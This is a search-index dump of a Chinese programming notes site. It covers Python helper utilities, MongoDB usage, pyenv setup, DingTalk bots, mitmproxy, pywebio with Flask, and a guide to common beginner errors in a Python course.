pdump(filename, data, lib=pickle):\n    open(filename, \"w\"+(\"b\" if lib==pickle else \"\")).write(lib.dumps(data))\n\ndef jload(filename, default=None):\n    return pload(filename, default=default, lib=json)\n\ndef jdump(filename, data):\n    return pdump(filename, data, lib=json)\n\nimport os\nimport csv\n\nfrom urllib.parse import quote, unquote\nfrom base64 import b64encode, b64decode, b16encode, b16decode\n\ndef bd(b64_string):\n    b64_string += \"=\" * ((4 - len(b64_string) % 4) % 4)\n    return b64decode(b64_string).decode()\n\njl=json.loads\n\ndef hd(b16_string):\n    return b16decode(b16_string.upper())\n\ndef myprint(*args, **kwargs):\n    args = list(args)\n    args[0] = \"[\"+time.strftime(\"%Y-%m-%d %H:%M:%S\")+\"] \"+str(args[0])\n    print(*args, **kwargs)\n\nimport lazy_import\nrequests = lazy_import.lazy_module(\"requests\")\nnumpy = np = lazy_import.lazy_module(\"numpy\")\nplt = lazy_import.lazy_module(\"matplotlib.pyplot\")\nel = EasyLogin = lazy_import.lazy_class(\"EasyLogin.EasyLogin\")\npp = pprint = lazy_import.lazy_function(\"pprint.pprint\")\nleval = lazy_import.lazy_function(\"ast.literal_eval\")\n\nimport hashlib\ndef _load_hashlib(name):\n    def f(s):\n        if isinstance(s, str):\n            s = bytes(s, \"utf-8\")\n        return getattr(hashlib, name)(s).hexdigest()\n    return f\nmd5 = _load_hashlib(\"md5\")\nsha1 = _load_hashlib(\"sha1\")\nsha512 = _load_hashlib(\"sha512\")\n\nclass _A():\n    def __getattr__(self, name):\n        global a\n        a=el()\n        return getattr(a, name)\na=_A()\n\nclass _sess():\n    def __getattr__(self, name):\n        global sess\n        sess=requests.session()\n        return getattr(sess, name)\nsess=_sess()\n\ndef t():\n    return int(time.time())\n\nfrom datetime import datetime, timedelta\ndef d(ts):\n    ts = int(ts)\n    if len(str(ts))==13:\n        ts = ts//1000\n    return datetime.fromtimestamp(ts).strftime(\"%Y-%m-%d %H:%M:%S\")\n</code></pre>"},{"location":"Python/#pythonmongodb","title":"Python\u4f7f\u7528MongoDB","text":"<p>\u722c\u53d6\u6570\u636eajax\u63a5\u53e3\u8fd4\u56de\u7684\u662fjson\u6570\u636e\uff0c\u61d2\u5f97\u8f6c\u6362\u6210mysql\u7684\u8868\u793a\uff0c\u76f4\u63a5\u4e22\u7ed9mongo\u5457</p> <p>\u53ef\u89c6\u5316\u5ba2\u6237\u7aef\u4f7f\u7528\u5b98\u65b9\u7684Compass</p>"},{"location":"Python/#server","title":"\u5b89\u88c5server","text":"<pre><code>docker run -d --name mongo -e MONGO_INITDB_ROOT_USERNAME=adminusername -e MONGO_INITDB_ROOT_PASSWORD=password -v /srv/mongo:/data/db -p 27017:27017 mongo\n</code></pre> <p>\u5b89\u88c5\u540e\u7684\u8fde\u63a5\u5b57\u7b26\u4e32\u662f\uff1a<code>mongodb://adminusername:password@ip:27017</code></p>"},{"location":"Python/#_15","title":"\u589e\u5220\u67e5\u6539","text":""},{"location":"Python/#_16","title":"\u67e5\u8be2","text":"<p>\u5d4c\u5957\u7684\u683c\u5f0f\u7528.\u8868\u793a \u4f8b\u5982<code>{\"a.b\": \"1\"}</code>\u53ef\u4ee5\u67e5\u5230\u6587\u6863<code>{a:{b:\"1\"}}</code></p> <p>Python\u4ee3\u7801\uff1a</p> <pre><code>import pymongo\nclient = pymongo.MongoClient(\"mongodb://adminusername:password@127.0.0.1:27017\")\ntable = client.database_name.table_name\nprint(table.find_one({\"_id\": id}))\nprint(table.count_documents({}))\n</code></pre>"},{"location":"Python/#_17","title":"\u6279\u91cf\u589e\u52a0","text":"<p>insert ignore into \u5ffd\u7565\u5df2\u7ecf\u5b58\u5728\u7684\uff1a</p> <pre><code>try:\ntable.insert_many(data, ordered=False)\nexcept pymongo.errors.BulkWriteError:\npass\n</code></pre> <p>replace into \u8986\u76d6\u5df2\u7ecf\u5b58\u5728\u7684\uff1a\u4f7f\u7528upcert\u4e0d\u5b58\u5728\u65f6\u63d2\u5165</p> <pre><code>for item in data:\n    # \u4f60\u5f88\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5b9a\u4e49_id\n# item[\"_id\"] = \"_\".join([...])\n# pprint(item)\ntable.update({'_id':item[\"_id\"]}, item, True)\n</code></pre>"},{"location":"Python/#_18","title":"\u5220\u9664","text":"<p>\u7c7b\u4f3c\u7684\u6709\u51fd\u6570\uff1adelete_one, delete_many</p>"},{"location":"Python/#join","title":"\u591a\u8868join\u67e5\u8be2","text":"<p>table\u4e2d\u6587\u6863\u91cc\u6709\u4e00\u4e2a\u5c5e\u6027idB\uff0c\u5bf9\u5e94tableB\u7684_id\uff0c\u4f7f\u7528<code>$lookup</code>\u505ajoin\u64cd\u4f5c\uff0c\u65e0\u8bba\u6709\u6ca1\u6709\u67e5\u5230\u90fd\u4f1a\u8fd4\u56de\u65b0\u7684\u6587\u6863\uff0c\u6ca1\u67e5\u5230\u65f6dst\u5c5e\u6027\u4e3a\u7a7a\u6570\u7ec4</p> <p>\u6240\u4ee5\u53ef\u4ee5\u7528<code>$match</code>\u7ee7\u7eed\u7b5b\u9009\u67e5\u5230\u7684\u5185\u5bb9\uff1b\u7136\u540e\u7edf\u8ba1\u6570\u91cf\uff0c\u6ce8\u610f\u5230$count\u5728\u6ca1\u6709\u7ed3\u679c\u7684\u65f6\u5019\u4e0d\u8fd4\u56de\u5185\u5bb9\uff0c\u9700\u8981\u5355\u72ec\u5904\u7406</p> <pre><code>def howmany():\npipeline = [\n{\"$match\": {\"idB\": {\"$exists\": True}}}, {\"$lookup\": {\"from\": 'tableB', \"localField\": 'idB', \"foreignField\": '_id', \"as\": 'dst'}},\n{\"$match\": {\"dst\": {\"$size\": 1}}},\n{\"$count\": \"cnt\"}\n]\ndata = list(table.aggregate(pipeline))\nif not data:\nreturn 0\nreturn data[0][\"cnt\"]\n</code></pre>"},{"location":"Python/#_19","title":"\u968f\u673a\u91c7\u6837","text":"<p>pipeline\u4e2d\u4f7f\u7528\uff1a\u4f46\u662f\u6ce8\u610f\u53ef\u80fd\u4f1a\u6709\u91cd\u590d\u7684\u5143\u7d20 \u9700\u8981\u81ea\u5df1\u53bb\u91cd</p> <pre><code>{\"$sample\": {\"size\":10}}\n</code></pre>"},{"location":"Python/#pyenvpython","title":"\u4f7f\u7528pyenv\u7f16\u8bd1\u5b89\u88c5\u4e0d\u540c\u7248\u672c\u7684Python","text":"<p>\u60f3\u81ea\u5df1\u7ef4\u62a4\u4e00\u4e2a\u5b8c\u6574\u7684\u865a\u62df\u73af\u5883\uff0c\u65b9\u4fbf\u7684\u5b89\u88c5\u5404\u79cd\u7248\u672c\uff0c\u7528pyenv\u5457</p> <p>\u5b89\u88c5\uff1a</p> <pre><code>git clone https://github.com/pyenv/pyenv.git ~/.pyenv\necho 'export PYENV_ROOT=\"$HOME/.pyenv\"' &gt;&gt; ~/.bash_profile\necho 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' &gt;&gt; ~/.bash_profile\necho -e 'if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then\\n  eval \"$(pyenv init -)\"\\nfi' &gt;&gt; ~/.bash_profile\n</code></pre> <p>\u7136\u540e\u5c31\u80fd\u7f16\u8bd1\u5b89\u88c5\u7279\u5b9a\u7248\u672c\u7684Python\u4e86\uff0c\u4ee53.7.0\u4e3a\u4f8b\uff1a\u4f7f\u7528\u6211\u63d0\u4f9b\u7684www.python.org\u7684\u955c\u50cf</p> <pre><code>apt install -y libffi-dev libgnutls28-dev\ncd ~/.pyenv/plugins\nsed -i 's#www.python.org#py.py3.io#g' $(grep www.python.org -r . -l)\npyenv install -v 3.7.0\npyenv global 3.7.0\n</code></pre> <p>\u4e4b\u540e\u4f7f\u7528\u5982\u679c\u9047\u5230\u5bc6\u7801\u5b66\u5e93\u7684\u95ee\u9898\uff1a</p> <pre><code>pip uninstall pycrypto pycryptodome\npip install pycryptodome\n</code></pre>"},{"location":"Python/#_20","title":"\u53d1\u9001\u9489\u9489\u6d88\u606f","text":"<p>\u7fa4\u804a\u52a0\u5165\u673a\u5668\u4eba \u5173\u952e\u8bcd\u8bbe\u7f6e\u4e3a\u4e00\u5b9a\u4f1a\u51fa\u73b0\u7684\u5b57\u7b26\u5982<code>.\u3002[</code>\uff0c\u83b7\u53d6url\u540e\u8c03\u7528\u65f6\u53ea\u9700\u8981\u4f20\u5165token\u90e8\u5206</p> <pre><code>import requests\ndef dingsend(token, text):\n    data = {\n        \"msgtype\" : \"text\" ,\n        \"text\" : { \"content\" : text },\n        \"isAtAll\" : False \n    }\n    return requests.post(\"https://oapi.dingtalk.com/robot/send?access_token=\"+token, json=data)\n</code></pre>"},{"location":"Python/#mitmproxy","title":"\u4f7f\u7528mitmproxy","text":"<p>python3 -m pip install mitmproxy</p> <p>\u53c2\u8003\uff1a https://stackoverflow.com/questions/51893788/using-mitmproxy-inside-python-script</p> <pre><code>from mitmproxy.options import Options\nfrom mitmproxy.proxy.config import ProxyConfig\nfrom mitmproxy.proxy.server import ProxyServer\nfrom mitmproxy.tools.dump import DumpMaster\n\nimport threading\nimport asyncio\nimport time\n\nclass Addon(object):\n    def __init__(self):\n        self.num = 1\n\n    def request(self, flow):\n        flow.request.headers[\"count\"] = str(self.num)\n\n    def response(self, flow):\n        self.num = self.num + 1\n        flow.response.headers[\"count\"] = str(self.num)\n        print(self.num)\n\n\n# see source mitmproxy/master.py for details\ndef loop_in_thread(loop, m):\n    asyncio.set_event_loop(loop)  # This is the key.\n    m.run_loop(loop.run_forever)\n\n\nif __name__ == \"__main__\":\n    options = Options(listen_host='0.0.0.0', listen_port=8080, http2=True)\n    m = DumpMaster(options, with_termlog=False, with_dumper=False)\n    config = ProxyConfig(options)\n    m.server = ProxyServer(config)\n    m.addons.add(Addon())\n\n    # run mitmproxy in backgroud, especially integrated with other server\n    loop = asyncio.get_event_loop()\n    t = threading.Thread( target=loop_in_thread, args=(loop,m) )\n    t.start()\n\n    # Other servers, such as a web server, might be started then.\n    time.sleep(20)\n    print('going to shutdown mitmproxy')\n    m.shutdown()\n</code></pre> <p>\u5b89\u88c5proxychains:</p> <pre><code>apt install proxychains4\n</code></pre> <p>\u4fee\u6539/etc/proxychains.conf\uff0c\u6700\u540e\u4e00\u884c\u6539\u6210<code>http 127.0.0.1 8080</code></p> <p>\u6dfb\u52a0\u4fe1\u4efb\uff1a\u53c2\u8003 https://superuser.com/questions/437330/how-do-you-add-a-certificate-authority-ca-to-ubuntu</p> <pre><code>cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitm.crt\nupdate-ca-certificates\n</code></pre>"},{"location":"Python/#pywebioflask-markdown","title":"pywebio+Flask \u6784\u5efa\u4ea4\u4e92\u5f0fmarkdown\u7f51\u7ad9","text":"<p>\u6bd4\u8f83\u9002\u5408\u7b80\u5355\u7ebf\u6027\u6d41\u7a0b\u7684\u5de5\u4f5c\uff0c\u4f8b\u5982\u53d6\u4ee3python\u81ea\u5e26\u7684input\u754c\u9762</p> <pre><code>import sys, os\nfrom pywebio.input import *\nfrom pywebio.output import *\nfrom pywebio.session import *\nfrom pywebio.platform.flask import webio_view\nfrom pywebio.platform import page\nfrom flask import Flask, session, request, redirect\n\napp = Flask(__name__)\n\nset_localstorage = lambda key, value: run_js(\"localStorage.setItem(key, value)\", key=key, value=value)\nget_localstorage = lambda key: eval_js(\"localStorage.getItem(key)\", key=key)\n\n@page.config(title=\"Application Title\")\ndef index():\n    run_js(\"history.replaceState({}, 'Application Title', '/index'); document.title='Application Title';\")\n    clear()\n    put_markdown(\"# Application Title\")\n    put_text(\"\")\n    data = input(\"input something:\")\n    put_text(\"your input: \"+data)\n\napp.add_url_rule('/', 'index', webio_view(index), methods=['GET', 'POST', 'OPTIONS'])\napp.add_url_rule('/index', 'index2', webio_view(index), methods=['GET', 'POST', 'OPTIONS'])\n\nimport webbrowser\nfrom threading import Timer\ndef open_browser():\n    webbrowser.open_new('http://127.0.0.1:1323/')\nif __name__ == '__main__':\n    debug = True\n    if \"win\" in sys.platform:\n        Timer(1, open_browser).start()\n        debug = False\n    app.run(host='0.0.0.0', port=1323, debug=debug)\n</code></pre> <p>\u6587\u4ef6\u4e0a\u4f20\uff1a\u4f8b\u5982xlsx</p> <pre><code>import openpyxl, time\n\n    f = file_upload(\"\u5bfc\u5165\u53f7\u7801(\u9700\u8981\u6309\u7167\u6a21\u677f\u586b\u5199)\", placeholder='\u9009\u62e9Excel\u6587\u4ef6 (xlsx\u683c\u5f0f)', required=True, accept=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\")\n    wb = openpyxl.load_workbook(filename=BytesIO(f[\"content\"]), data_only=True, read_only=True)\n    data = []\n    for r in wb.active.rows:\n        item = [i.value for i in r]\n        data.append(item)\n</code></pre> <p>\u8f93\u51fa\u8868\u683c\uff1a</p> <pre><code>put_table(data, header=[\"Col1\", \"Col2\"])\n</code></pre>"},{"location":"PythonCourse/","title":"Python\u7a0b\u5e8f\u8bbe\u8ba1\u8bfe\u7a0b","text":""},{"location":"PythonCourse/#_1","title":"\u5148\u672c\u5730\u6d4b\u8bd5\u80fd\u901a\u8fc7\u518d\u63d0\u4ea4","text":"<p>PTA\u6ca1\u6709\u63d0\u4f9b\u8be6\u7ec6\u7684\u62a5\u9519\uff0c\u4f60\u90fd\u4e0d\u77e5\u9053\u9519\u54ea\u4e86\u600e\u4e48\u6539\uff0c\u5efa\u8bae\u4f60\u8bd5\u8bd5\u672c\u6587\u63d0\u5230\u7684\u9519\u8bef\uff0c\u8bb0\u4f4f\u9519\u8bef\u4fe1\u606f\u4e0b\u6b21\u9047\u5230\u4e5f\u5c31\u4e0d\u614c\u4e86</p> <p>\u672c\u5730Python\u8dd1\u6210\u529f\u518d\u63d0\u4ea4\u63d0\u9ad8\u6548\u7387\uff0c\u7701\u70b9\u65f6\u95f4</p>"},{"location":"PythonCourse/#_2","title":"\u5168\u89d2\u7684\u7b26\u53f7","text":"<pre><code>a=int\uff08input\uff08\uff09\uff09\nb=int\uff08input\uff08\uff09\uff09\nprint(a+b)\n</code></pre> <p>\u62a5\u9519\uff1a</p> <pre><code>  File \"&lt;stdin&gt;\", line 1\n    a=int\uff08input\uff08\uff09\uff09\n                 ^\nSyntaxError: invalid character in identifier\n</code></pre> <p>\u770b\u51fa<code>(</code>\u4e0e<code>\uff08</code>\u7684\u533a\u522b\u4e86\u561b\uff0cPython\u8bed\u8a00\u7684\u62ec\u53f7\u8981\u6c42\u534a\u89d2\u7684\u62ec\u53f7</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a \u5173\u6389\u4e2d\u6587\u8f93\u5165\u6cd5\uff01</p>"},{"location":"PythonCourse/#input","title":"input\u53ea\u8bfb\u53d6\u8f93\u5165\u7684\u4e00\u884c","text":"<p>\u770b\u6e05\u695a\u9898\u76ee\uff0c\u5982\u679c\u9898\u76ee\u6709\u4e24\u884c\u8f93\u5165\uff0c\u5c31\u9700\u8981\u4e24\u6b21input()</p> <p>\u5982\u679c\u9898\u76ee\u53ea\u6709\u4e00\u884c\u8f93\u5165\uff0c\u6bd4\u5982\u4e00\u884c\u540c\u65f6\u7ed9\u4e86\u4e24\u4e2a\u6570\u7a7a\u683c\u5206\u9694\uff0c\u4f60\u9700\u8981<code>input().split()</code></p>"},{"location":"PythonCourse/#map","title":"\u6269\u5c55\u4e00\u4e0b\uff1a\u4f60\u53ef\u4ee5\u4f7f\u7528<code>map</code>\u51fd\u6570\u6765\u6279\u91cf\u8c03\u7528\u51fd\u6570","text":"<p>\u7528\u6cd5\u662f<code>map(\u76ee\u6807\u51fd\u6570\uff0c\u5217\u8868)</code></p> <p>\u8fd4\u56de \u5217\u8868\u6bcf\u4e2a\u5143\u7d20\u8c03\u7528\u76ee\u6807\u51fd\u6570\u7684\u7ed3\u679c\u7684\u8fed\u4ee3\u5668 iterator\uff0c\u518d\u7528list\u53ef\u4ee5\u5f97\u5230\u5217\u8868</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\u9898\u76ee\u8981\u5728\u4e00\u884c\u4e2d\u8f93\u5165\u591a\u4e2a\u6574\u6570</p> <pre><code># map\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u662f\u8fed\u4ee3\u5668\uff0c\u88ab\u8bfb\u5230\u7684\u65f6\u5019\u624d\u4f1a\u771f\u6b63\u8c03\u7528\u76ee\u6807\u51fd\u6570\uff0c\u60f3\u5f97\u5230\u5217\u8868\u8fd8\u9700\u8981\u7528list\n&gt;&gt;&gt; map(int, input().split())\n222 444\n&lt;map object at 0x000001D87FB4DAC8&gt;\n\n&gt;&gt;&gt; list(map(int, input().split()))\n222 444\n[222, 444]\n\n&gt;&gt;&gt; a, b = map(int, input().split())\n333 555\n&gt;&gt;&gt; a\n333\n&gt;&gt;&gt; b\n555\n</code></pre>"},{"location":"PythonCourse/#_3","title":"\u4e0d\u8981\u8f93\u51fa\u4efb\u4f55\u591a\u4f59\u7684\u63d0\u793a\u4fe1\u606f","text":"<pre><code>A=int(input('\u88ab\u52a0\u6570'))\nB=int(input('\u52a0\u6570'))\nprint(A+B)\n</code></pre> <p>PTA\u5224\u9898\u5c31\u662f\u5224\u65ad\u4f60\u7a0b\u5e8f\u7684\u8f93\u51fa\u662f\u5426 \u548c\u6807\u51c6\u7b54\u6848\u5b8c\u5168\u4e00\u81f4 \u5b8c\u5168\u4e00\u81f4 \u5b8c\u5168\u4e00\u81f4</p> <p>\u9898\u76ee\u6ca1\u6709\u8981\u6c42\u4f60\u8f93\u51fa<code>\u88ab\u52a0\u6570</code>\u8fd9\u79cd\u63d0\u793a\u4fe1\u606f\uff0c\u4f60\u5c31\u5565\u4e5f\u522b\u8f93\u51fa\uff0c\u4e0d\u8981\u753b\u86c7\u6dfb\u8db3\uff01 </p> <p>\u89e3\u51b3\u65b9\u6848\uff1a \u76f4\u63a5input()\u5c31\u884c\u4e86</p>"},{"location":"PythonCourse/#input_1","title":"input\u51fd\u6570\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32","text":"<p>\u522b\u5fd8\u4e86\u628a\u5b57\u7b26\u4e32\u8f6c\u6210\u4f60\u9700\u8981\u7684\u7c7b\u578b\uff0c\u6bd4\u5982int()</p> <p>\u5b57\u7b26\u4e32\u52a0\u5b57\u7b26\u4e32\u662f\u62fc\u63a5\uff0c \u5b57\u7b26\u4e32\u4e0d\u80fd\u548c\u6574\u6570\u76f8\u52a0</p> <pre><code>&gt;&gt;&gt; \"1\"+\"2\"\n'12'\n&gt;&gt;&gt; 1+2\n3\n&gt;&gt;&gt; \"1\"+2\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: can only concatenate str (not \"int\") to str\n</code></pre>"},{"location":"PythonCourse/#int-c","title":"\u6ce8\u610f\u7c7b\u578b\u8f6c\u6362\u7684int\u662f\u8981\u8c03\u7528\u7684 \u548cC\u8bed\u8a00\u4e0d\u4e00\u6837","text":"<p>\u8fd9\u662fC\u8bed\u8a00\u7684\u8bed\u6cd5\uff0cPython\u4e0d\u652f\u6301</p> <pre><code>sum = (int)x + (int)y\n</code></pre> <p>\u5e94\u8be5\u5199\uff1a</p> <pre><code>sum = int(x) + int(y)\n</code></pre> <p>\u53e6\u5916 \u4e0d\u5efa\u8bae\u547d\u540d\u4e3asum\uff0c\u56e0\u4e3asum\u672c\u8eab\u662fPython\u7684\u5185\u7f6e\u51fd\u6570 \u4f60\u8d4b\u503c\u4e86\u5c31\u4e0d\u80fd\u518d\u8c03\u7528\u539f\u6765\u7684sum\u51fd\u6570\u4e86</p> <p>\u5982\u679c\u4f60\u8986\u76d6\u4e86sum\u4e4b\u540e\u518d\u53bb\u8c03\u7528sum\u51fd\u6570 \u4f1a\u62a5\u9519</p> <pre><code>&gt;&gt;&gt; sum=1\n&gt;&gt;&gt; sum([1,2])\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: 'int' object is not callable\n</code></pre> <p>\u4f60\u8fd8\u53ef\u4ee5\u8fd9\u4e48\u505a\uff1a\u7528map\u548c\u5217\u8868\u63a8\u5bfc\u5f0f</p> <pre><code>s = sum(map(int, [x,y]))\ns = sum([int(i) for i in [x,y]])\n</code></pre>"},{"location":"PythonCourse/#_4","title":"\u6ce8\u610f\u62ec\u53f7\u7684\u5339\u914d","text":"<pre><code>a,b,c=map(int,(input().split())\n</code></pre> <p>\u591a\u4e86\u4e00\u4e2a(\uff0c \u7ec6\u5fc3\u4e00\u70b9\u5373\u53ef \u62a5\u9519\uff1a</p> <pre><code>SyntaxError: unexpected EOF while parsing\n</code></pre>"},{"location":"PythonCourse/#_5","title":"\u65b9\u6cd5\u662f\u9700\u8981\u8c03\u7528\u7684","text":"<pre><code>a,b,c=input().split\n</code></pre> <p>\u672b\u5c3e\u5c11\u4e86() \u62a5\u9519\uff1a</p> <pre><code>Traceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: cannot unpack non-iterable builtin_function_or_method object\n</code></pre>"},{"location":"PythonCourse/#_6","title":"\u6ce8\u610f\u7f29\u8fdb \u4e0d\u80fd\u6709\u591a\u4f59\u7a7a\u683c","text":"<pre><code>s=\"Python\u8bed\u8a00\u7b80\u5355\u6613\u5b66\"  \n     print(s)\n</code></pre> <p>\u7b2c\u4e8c\u884c\u591a\u4e86\u524d\u9762\u7684\u7a7a\u683c\uff0c\u4f1a\u62a5\u9519\uff1a</p> <pre><code>  File \"&lt;stdin&gt;\", line 1\n    print(s)\n    ^\nIndentationError: unexpected indent\n</code></pre>"},{"location":"PythonCourse/#print","title":"print\u7684\u7528\u6cd5","text":"<p>\u9519\u8bef\u793a\u4f8b\uff1a</p> <pre><code>print(sum = s)\n</code></pre> <p>\u4f60\u8981\u7ad9\u5728\u8bed\u8a00\u5f00\u53d1\u8005\u7684\u89d2\u5ea6\u601d\u8003\uff0c\u4f60\u62ec\u53f7\u91ccsum\u8868\u793a\u7684\u662f\u5b57\u9762\u610f\u601d\u4e0a\u7684\u201dsum\u201d\u5b57\u7b26\u4e32\u5462\u8fd8\u662f\u5185\u7f6e\u7684sum\u51fd\u6570\u5462\uff1f\u8bed\u8a00\u7684\u8bbe\u8ba1\u8981\u4fdd\u8bc1\u6ca1\u6709\u6b67\u4e49</p> <p>\u6b63\u786e\u7684\u5199\u6cd5\uff1a\u9700\u8981\u539f\u6837\u8f93\u51fa\u7684\u90fd\u8981\u52a0\u4e0a\u5f15\u53f7\uff01</p> <pre><code>print(\"sum =\", s)\n</code></pre> <p>\u8fd9\u4e2a\u9898\u76ee\u8981\u6c42\u7b49\u53f7\u4e24\u8fb9\u6709\u7a7a\u683c\uff0c\u5982\u679c\u6ca1\u6709\u6ce8\u610f\u5230\u8fd9\u4e00\u70b9\u4f1a\u683c\u5f0f\u9519\u8bef</p> <p>print\u53ef\u4ee5\u63a5\u53d7\u4e0d\u5b9a\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5728\u8f93\u51fa\u7684\u65f6\u5019\u6bcf\u4e2a\u53c2\u6570\u4e4b\u95f4\u4f1a\u52a0\u4e0a\u7a7a\u683c\uff0c\u6240\u4ee5\u4e0a\u8ff0\u5b57\u7b26\u4e32\u91cc\u7b49\u53f7\u53f3\u8fb9\u662f\u4e0d\u5199\u7a7a\u683c\u7684</p>"},{"location":"PythonCourse/#f-string","title":"\u4f60\u8fd8\u53ef\u4ee5\u4f7f\u7528f-string","text":"<p>\u4e0a\u8ff0\u5199\u6cd5\u53ef\u4ee5\u66ff\u6362\u6210\uff1a</p> <pre><code>print( f\"sum = {s}\" )\n</code></pre> <p>\u6ce8\u610f\u5230\u5b57\u7b26\u4e32\u5f15\u53f7\u524d\u9762\u7684f\uff0c\u8bf4\u660e\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u6a21\u677f\uff0cPython\u9047\u5230\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4f1a\u81ea\u52a8\u628as\u7684\u503c\u586b\u8fdb\u53bb\u3002</p> <p>f-string\u5728Python3.7\u91cc\u9762\u5f15\u5165\uff0cPTA\u662f\u652f\u6301\u7684\uff0c\u5982\u679c\u4f60\u7684Python\u7248\u672c\u4f4e\u4e8e3.7\uff0c\u4f60\u53ef\u4ee5\u7528\u8fd9\u4e9b\u901a\u7528\u7684\u5199\u6cd5\uff08\u53ea\u662f\u4e0d\u591f\u7f8e\u89c2\u4e86\uff09\uff1a</p> <pre><code>print(\"sum = {}\".format(s)) # \u9700\u8981\u8bb0\u6e05\u695a\u591a\u4e2a\u53d8\u91cf\u4e4b\u95f4\u7684\u987a\u5e8f \nprint(\"sum = {s}\".format(s=s)) # \u6bcf\u4e2a\u53d8\u91cf\u90fd\u8981\u5199\u4e00\u904d\nprint(\"sum = {s}\".format(**locals())) # \u76f4\u63a5\u628a\u6240\u6709\u5c40\u90e8\u53d8\u91cf\u90fd\u63d0\u4f9b\u7ed9format \u5c31\u4e0d\u7528\u81ea\u5df1\u5199\u4e86\n# \u5982\u679c\u7528\u5728\u51fd\u6570\u91cc\uff0c\u4f60\u53ef\u80fd\u60f3\u8f93\u51fa\u5168\u5c40\u53d8\u91cf\uff0c\u672a\u5b8c\u5f85\u7eed\n</code></pre>"},{"location":"PythonCourse/#_7","title":"\u6ce8\u610f\u5f15\u53f7\u62ec\u53f7\u7684\u5339\u914d\uff0c\u5c24\u5176\u662f\u53d8\u5f97\u590d\u6742\u7684\u65f6\u5019","text":"<p>\u9519\u8bef\u793a\u4f8b \u770b\u770b\u5f15\u53f7\u7684\u7ed3\u675f\u4f4d\u7f6e</p> <pre><code>print(f'f({x:.1f}) = {1/x:.1f'})\n</code></pre> <p>\u6b63\u786e\u7684\u5199\u6cd5\u662f</p> <pre><code>print(f'f({x:.1f}) = {1/x:.1f}')\n</code></pre>"},{"location":"PythonCourse/#forifelse","title":"for,if,else\u53f3\u8fb9\u90fd\u8981\u6709\u5206\u53f7\uff0c\u6bcf\u4e2a\u5206\u53f7\u7684\u4e0b\u4e00\u884c\u589e\u52a0\u7f29\u8fdb","text":"<p>\u9519\u8bef\u793a\u4f8b</p> <pre><code>num = float(input())\nif num &lt; 0 :\n    print('Invalid Value!')\nelif num &lt;= 50:\n    cost = num * 0.53\nprint(\"cost = %.2f\" %  cost)\nelse:\n    cost = 50*0.53+(num-50)*(0.05+0.53)\nprint(\"cost = %.2f\" %  cost)\n</code></pre> <p>elif\u91cc\u9762\u7684print\u6ca1\u6709\u7f29\u8fdb\uff0celse\u5fc5\u987b\u548celif\u548cif\u5e73\u7ea7\uff0c\u4e4b\u95f4\u7684\u4ee3\u7801\u5fc5\u987b\u66f4\u591a\u7f29\u8fdb</p> <p>\u4fee\u6539\u65b9\u6cd5\uff1a\u53bb\u6389\u4e0a\u9762\u7684print\u6216\u8005\u4e24\u5904print\u90fd\u589e\u52a0\u7f29\u8fdb</p>"},{"location":"PythonCourse/#_8","title":"\u7ee7\u7eed\u5f3a\u8c03 \u4e0d\u8981\u51fa\u73b0\u4e2d\u6587\u62ec\u53f7","text":"<p>\u987a\u5e26\u5f3a\u8c03\u4e0d\u8981\u5728PTA\u91cc\u89e3\u9898\uff0c\u5148\u53bbPython IDLE\u6216\u8005thonny\u91cc\u672c\u5730\u505a\u51fa\u6765\u518d\u590d\u5236\u7c98\u8d34\u63d0\u4ea4</p> <p>\u4f60\u7684\u6bcf\u6b21\u9519\u8bef\u63d0\u4ea4\u6211\u90fd\u4f1a\u770b\uff0c\u4f60\u53cd\u590d\u51fa\u73b0\u540c\u4e00\u6b21\u9519\u8bef\u8ba9\u6211\u5f88\u70e6</p> <p>\u4f60\u4fe1\u4e0d\u4fe1\u8fd9\u4e2a\u9519\u8bef\u4e0b\u6b21\u4f5c\u4e1a\u8fd8\u4f1a\u51fa\u73b0</p> <p>\u9519\u8bef\u793a\u4f8b</p> <pre><code>if\uff08x&lt;0\uff09:\n    print(\"Invalid Value!\")\n</code></pre> <p>Python\u7684if\u4e5f\u4e0d\u9700\u8981\u62ec\u53f7\uff0c\u76f4\u63a5\u5199\u5c31\u884c</p> <pre><code>if x&lt;0:\n    print(\"Invalid Value!\")\n</code></pre>"},{"location":"PythonCourse/#return-0","title":"\u4e0d\u8981\u51fa\u73b0return 0","text":"<p>\u5982\u679c\u4f60\u4e00\u5b9a\u8981\u8ba9\u7a0b\u5e8f\u7acb\u523b\u9000\u51fa\uff0c\u7528<code>exit(0)</code>\uff0c\u6548\u679c\u7b49\u4ef7\u4e8eC\u8bed\u8a00main\u51fd\u6570\u91cc<code>return 0;</code></p>"},{"location":"PythonCourse/#_9","title":"\u770b\u6e05\u9898\u76ee","text":""},{"location":"PythonCourse/#int","title":"\u8f93\u5165\u5b9e\u6570\u522b\u7528int()","text":"<p>\u9898\u76ee\u8bf4  \u8f93\u5165\u5728\u4e00\u884c\u4e2d\u7ed9\u51fa\u5b9e\u6570x</p> <p>\u4f60\u9700\u8981<code>float(input())</code></p>"},{"location":"PythonCourse/#_10","title":"\u770b\u6e05\u9898\u76ee\u8f93\u5165\u7684\u683c\u5f0f","text":"<p>\u6bd4\u5982\u9898\u76ee\u8f93\u5165\u7684\u4f8b\u5b50\u662f\u8fd9\u6837\u7684</p> <pre><code>  1,  5\n</code></pre> <p>\u4f60\u5c31\u4e0d\u80fd\u7528 <code>a,b=input().split()</code></p> <p>\u800c\u5e94\u8be5 <code>a,b=input().split(',')</code></p> 